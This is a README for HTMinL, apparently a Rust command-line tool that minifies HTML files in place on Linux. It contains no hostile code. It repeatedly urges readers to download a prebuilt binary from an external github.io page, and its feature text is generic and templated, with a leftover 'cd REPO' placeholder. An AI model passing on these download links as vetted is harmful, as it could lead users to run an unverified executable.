# HTMinL v2026 - HTML minifier 2026

> **HTMinL is a Rust CLI for x86-64 Linux that rewrites HTML in place, helping production cleanup happen faster and with less manual work.**

[![Platform](https://img.shields.io/badge/Platform-x86--64%20Linux-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelxwfoster7123/htminl-rust-html-minify?style=flat-square)](https://github.com/michaelxwfoster7123/htminl-rust-html-minify)

---

<p align="center">
  <a href="https://michaelxwfoster7123.github.io/htminl-rust-html-minify/">
    <img src="https://img.shields.io/badge/Download-HTMinL%20Latest-brightgreen?style=for-the-badge" alt="Download HTMinL">
  </a>
</p>

> **[Direct Download - HTMinL v2026](https://michaelxwfoster7123.github.io/htminl-rust-html-minify/)**

---

[Download Latest Build](https://michaelxwfoster7123.github.io/htminl-rust-html-minify/)

---

## Overview

HTMinL is a command-line utility for minifying HTML on x86-64 Linux systems. Its in-place workflow keeps the process close to your existing project files, so you can trim HTML output without shuffling content through extra packaging or copy steps.

Because it is written in Rust, HTMinL fits well into production-oriented builds where HTML needs to be cleaned up quickly and consistently. It is a practical choice for developers and automation pipelines that handle many HTML files and want a simple way to prepare them for release.

---

## What it does

- Minifies HTML directly in the original files
- Walks directories recursively for bulk runs
- Uses DOM-based parsing to handle HTML structure
- Collapses whitespace to make output smaller and cleaner
- Applies HTML cleanup steps aimed at production use
- Works as a terminal-first CLI tool
- Built in Rust for a compact native toolchain
- Targets x86-64 Linux environments

---

## Installation

To build from source, clone the repository on a supported x86-64 Linux system:

    git clone https://github.com/michaelxwfoster7123/htminl-rust-html-minify.git
    cd REPO

From there, compile or run it with your Rust toolchain and the setup used by your project. If a release build is available, you can also use the download link above and launch it from the extracted directory.

---

## Usage

Point HTMinL at an HTML file or a directory that contains HTML. In a common workflow, you run it against your site output, allow it to scan recursively, and then inspect the files after they have been updated in place.

Example flow:

    htminl ./site
    htminl ./public/index.html

A good place to use it is after your build completes, so the final HTML is already minimized before deployment.

---

## Configuration

HTMinL is designed for command-line use, so its behavior is usually set through the arguments you provide when starting it. If you want reusable defaults, place them in shell scripts, build scripts, or wrapper commands that sit alongside your deployment process.

Example layout:

    htminl [path]
    htminl --help

---

## Requirements

- x86-64 Linux
- Rust toolchain if building from source
- Terminal access for CLI execution
- A directory or HTML file set to process

---

## FAQ

**How do I get updates?**  
Use the download link above to grab the latest published build, or clone the repository and rebuild it when new changes are available.

**Does it work on whole folders?**  
Yes. Recursive directory scanning is one of the main behaviors, so HTMinL can handle multiple HTML files across a project tree.

**Where are the settings stored?**  
HTMinL is driven from the CLI, so behavior is generally controlled through command-line arguments and any scripts you build around it.

**What should I do if a file does not change as expected?**  
Confirm the input path, make sure the file actually contains HTML, and double-check your command options or wrapper script before trying again.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
